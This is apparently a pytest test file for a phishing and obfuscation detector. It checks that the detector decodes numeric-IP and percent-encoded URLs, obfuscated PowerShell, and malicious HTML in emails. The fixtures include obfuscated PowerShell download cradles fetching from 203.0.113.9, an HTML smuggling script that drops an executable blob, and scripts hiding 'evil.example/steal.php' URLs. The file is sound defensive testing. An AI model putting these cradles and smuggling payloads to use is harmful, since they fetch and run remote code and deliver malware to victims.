"""Ofuscación: URLs (IP numérica, %XX), comandos (^, `, +, [char]) y HTML (smuggling, entidades, texto oculto), con sus casos negativos."""
import base64
from email.message import EmailMessage

import pytest

from backend import deobf, htmlscan, phishing as P
from backend.analysis import analyze
from backend.parser import load_events
from tests.unit.test_negativos import rules, win


# ---------------------------------------------------------------- URLs
@pytest.mark.parametrize("host,ip", [("3232235777", "192.168.1.1"), ("0xC0A80101", "192.168.1.1"), ("0xC0.0xA8.1.1", "192.168.1.1"),
                                      ("0300.0250.01.01", "192.168.1.1"), ("1.2", "1.0.0.2"), ("[::ffff:1.2.3.4]", "1.2.3.4")])
def test_numeric_hosts_are_resolved_to_dotted_quad(host, ip):
    r = deobf.normalize_url(f"http://{host}/login")
    assert r["ip"] == ip and ip in r["url"] and r["techniques"]


@pytest.mark.parametrize("host", ["192.168.1.1", "example.com", "1234.example.com", "10.0.0.1", "999.1.1.1", "4294967296"])
def test_normal_hosts_are_left_alone(host):
    assert deobf.normalize_url(f"http://{host}/").get("ip") is None


def test_percent_encoded_host_and_double_encoding():
    r = deobf.normalize_url("https://%65%78%61%6d%70%6c%65.com/x")
    assert r["url"] == "https://example.com/x" and any("host" in t for t in r["techniques"])
    assert deobf.normalize_url("https://a.com/%2570ath")["techniques"] == []        # doble codificación en la ruta: la usan los enlaces de rastreo legítimos
    assert any("host" in t for t in deobf.normalize_url("https://%2565xample.com/")["techniques"])


@pytest.mark.parametrize("u", ["https://example.com/a%20b", "https://example.com/?q=a%2Fb&x=1", "https://example.com/%C3%A9", "https://www.google.com/search?q=hola"])
def test_ordinary_percent_encoding_is_not_flagged(u):
    assert deobf.normalize_url(u)["techniques"] == []


def test_scheme_hidden_by_tabs_and_entities_is_exposed():
    assert deobf.normalize_url("jav\tascript:alert(1)")["clean"] == "javascript:alert(1)"
    assert deobf.normalize_url("&#106;avascript:alert(1)")["clean"].startswith("javascript:")


def test_redirect_target_is_found_only_for_other_sites():
    assert deobf.normalize_url("https://a.com/go?url=https%3A%2F%2Fevil.example%2Fx")["redirect"] == "https://evil.example/x"
    assert deobf.normalize_url("https://a.com/go?url=https://a.com/inner")["redirect"] == ""
    assert deobf.normalize_url("https://a.com/go?page=2")["redirect"] == ""


def test_huge_url_is_capped():
    assert len(deobf.normalize_url("http://a.com/" + "%41" * 100_000)["clean"]) <= deobf.MAX_URL


# ---------------------------------------------------------------- comandos
OBFUSCATED = [
    "p^o^w^e^r^s^h^e^l^l -w hidden -nop",
    "i`e`x (n`ew-ob`ject net.webclient).d`ownloadstr`ing('http://203.0.113.9/a')",
    "(New-Object Net.WebClient).('Down'+'loadString')('http://203.0.113.9/a')",
    "$c=[char]105+[char]101+[char]120; & $c",
    "'iXeXx'.Replace('X','')",
    "[char[]](105,101,120) -join ''",
    "cmd /c po\"wer\"she\"ll\" -nop",
]


@pytest.mark.parametrize("cmd", OBFUSCATED)
def test_known_obfuscations_reveal_their_keyword(cmd):
    r = deobf.command(cmd)
    assert deobf.reveals(cmd, r), r


@pytest.mark.parametrize("cmd", ["ipconfig /all", 'findstr "^abc" f.txt', "powershell -File C:\\scripts\\backup.ps1",
                                 "$x = 'Hola ' + 'mundo'; Write-Host $x", "cmd /c echo hola", "net use Z: \\\\fs01\\share", "C:\\Program Files\\App\\app.exe /s"])
def test_ordinary_commands_are_not_reported(cmd):
    assert not deobf.reveals(cmd, deobf.command(cmd))


def test_frombase64string_outside_enc_is_decoded():
    blob = base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/x')").decode()
    r = deobf.command(f"powershell -c \"iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{blob}')))\"")
    assert r["decoded"] and "203.0.113.9" in r["text"]


def test_command_deobfuscation_is_bounded():
    r = deobf.command("'a'+" * 50_000 + "'b'")
    assert len(r["text"]) <= deobf.MAX_CMD + 3000


def _find(cmd, rule):
    case = win([dict(eid=4688, user="CORP\\ana", desc="process", cmd=cmd)])
    return [f for f in analyze(*load_events(*case))["findings"] if f["rule"] == rule]


def test_obfuscated_powershell_becomes_a_finding_with_the_clean_command():
    f = _find("p^o^w^e^r^s^h^e^l^l -w hidden -nop -c calc", "cmd_obfuscated_cmd")
    assert f and f[0]["severity"] == "Alto" and "T1027.010" in f[0]["mitre"]
    assert any("Comando tras quitar la ofuscación" in i["note"] and "powershell" in i["value"] for i in f[0]["iocs"])
    assert f[0]["metrics"]["ofuscacion"]


def test_obfuscated_download_cradle_is_also_a_download_finding_one_level_higher():
    plain = _find("(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')", "cmd_download_cradle")
    obf = _find("(New-Object Net.WebClient).('Down'+'loadString')('http://203.0.113.9/a')", "cmd_download_cradle")
    assert plain[0]["severity"] == "Alto" and obf[0]["severity"] == "Crítico"
    assert any("ofuscado" in r for r in obf[0]["reasons"])


@pytest.mark.parametrize("cmd", ["ipconfig /all", "cmd /c echo hola", 'findstr "^abc" f.txt', "$x = 'Hola ' + 'mundo'"])
def test_ordinary_commands_produce_no_obfuscation_finding(cmd):
    case = win([dict(eid=4688, user="CORP\\ana", desc="process", cmd=cmd)])
    assert "cmd_obfuscated_cmd" not in rules(case)


# ---------------------------------------------------------------- HTML
def b64(t: str) -> str:
    return base64.b64encode(t.encode()).decode()


def test_html_smuggling_is_critical():
    html = f"<script>var d=atob('{b64('MZ' * 600)}');var b=new Blob([d]);var a=document.createElement('a');a.href=URL.createObjectURL(b);a.click()</script>"
    r = htmlscan.scan(html, "adjunto")
    assert [s["severity"] for s in r["signals"]][0] == "Crítico" and "T1027.006" in r["signals"][0]["mitre"]


def test_obfuscated_script_extracts_hidden_url():
    r = htmlscan.scan(f"<script>var u=atob('{b64('http://evil.example/steal.php')}');eval(unescape('%61%6c%65%72%74'))</script>")
    assert r["urls"] == ["http://evil.example/steal.php"] and any(s["key"] == "jsobf" for s in r["signals"])


def test_fromcharcode_and_hex_escapes_are_decoded():
    codes = ",".join(str(ord(c)) for c in "http://evil.example/z")
    assert htmlscan.scan(f"<script>document.location=String.fromCharCode({codes});eval(x)</script>")["urls"] == ["http://evil.example/z"]
    esc = "".join(f"\\x{ord(c):02x}" for c in "http://evil.example/h")
    assert "http://evil.example/h" in htmlscan.scan(f"<script>var u='{esc}';eval(u)</script>")["urls"]


def test_meta_refresh_and_numeric_entities_href():
    r = htmlscan.scan('<meta http-equiv="refresh" content="0; url=https://evil.example/login"><a href="&#104;&#116;&#116;&#112;://x.example">x</a>')
    assert r["urls"] == ["https://evil.example/login"] and {s["key"] for s in r["signals"]} >= {"meta", "nument"}


def test_hidden_text_needs_volume_to_count():
    assert not htmlscan.scan('<div style="display:none">Resumen del boletín de noviembre</div><p>Hola</p>')["signals"]
    r = htmlscan.scan('<div style="display:none">' + "oferta gratis premio " * 20 + "</div>")
    assert [s["key"] for s in r["signals"]] == ["hidden"]


@pytest.mark.parametrize("html", ["<p>Hola <b>Juan</b></p><a href='https://x.com/a?b=1&amp;c=2'>x</a>", "<script>function f(){return 1+1}</script><p>x</p>", ""])
def test_ordinary_html_is_quiet_except_body_scripts(html):
    sigs = htmlscan.scan(html, "adjunto")["signals"]
    assert not sigs


def test_huge_html_does_not_hang():
    assert htmlscan.scan("<div>" * 200_000 + "x")["signals"] is not None


# ---------------------------------------------------------------- integrado en el análisis de correo
def mail(html=None, body="Hola", attachments=(), link=None):
    m = EmailMessage()
    m["From"], m["To"], m["Subject"], m["Date"], m["Message-ID"] = "Ana <ana@corp.example>", "u@corp.example", "Hola", "Mon, 02 Nov 2026 09:00:00 +0000", "<1@corp.example>"
    m["Authentication-Results"] = "mx.corp.example; spf=pass smtp.mailfrom=corp.example; dkim=pass header.d=corp.example; dmarc=pass header.from=corp.example"
    m.set_content(body)
    if html:
        m.add_alternative(html, subtype="html")
    for name, data, sub in attachments:
        m.add_attachment(data, maintype="text" if sub == "html" else "application", subtype=sub, filename=name)
    return bytes(m)


def titles(r):
    return [s["title"] for s in r["signals"]]


def test_numeric_ip_link_in_email_is_flagged_and_normalized():
    r = P.analyze_eml(mail(html='<a href="http://3232235777/login">Entrar</a>'), "t.eml")
    assert any(t.startswith("URL con ofuscación") for t in titles(r)) and "Enlace a una dirección IP" in titles(r)
    assert r["urls"][0]["host"] == "192.168.1.1" and "normalized" in r["urls"][0]


def test_plain_link_has_no_obfuscation_signal():
    r = P.analyze_eml(mail(html='<a href="https://corp.example/a%20b?x=1">Ver</a>'), "t.eml")
    assert not any("ofuscación" in t for t in titles(r))


def test_redirect_wrapper_target_is_analyzed_without_noise():
    wrapped = "https://eur01.safelinks.protection.outlook.com/?url=http%3A%2F%2F3232235777%2Fx&data=1"
    r = P.analyze_eml(mail(html=f'<a href="{wrapped}">Ver</a>'), "t.eml")
    assert any(u["location"] == "destino dentro de un parámetro" and u["host"] == "192.168.1.1" for u in r["urls"])
    assert "El enlace lleva otra dirección dentro" not in titles(r)


def test_open_redirect_on_other_domain_is_low_signal():
    r = P.analyze_eml(mail(html='<a href="https://track.corp.example/go?u=https%3A%2F%2Fother.example%2Fx">Ver</a>'), "t.eml")
    assert "El enlace lleva otra dirección dentro" in titles(r)


def test_html_attachment_with_smuggling_is_critical_with_iocs():
    page = f"<html><script>var u=atob('{b64('http://evil.example/p')}');var d=atob('{b64('MZ' * 600)}');var b=new Blob([d]);location=URL.createObjectURL(b)</script></html>"
    r = P.analyze_eml(mail(attachments=[("factura.html", page.encode(), "html")]), "t.eml")
    assert r["severity"] == "Crítico" and any("HTML smuggling" in t for t in titles(r))
    assert any(i["value"] == "http://evil.example/p" for i in r["iocs"])


def test_meta_refresh_in_body_follows_the_target():
    r = P.analyze_eml(mail(html='<meta http-equiv="refresh" content="0;url=http://3232235777/x"><p>Hola</p>'), "t.eml")
    assert any(u["host"] == "192.168.1.1" for u in r["urls"]) and any("meta refresh" in t for t in titles(r))
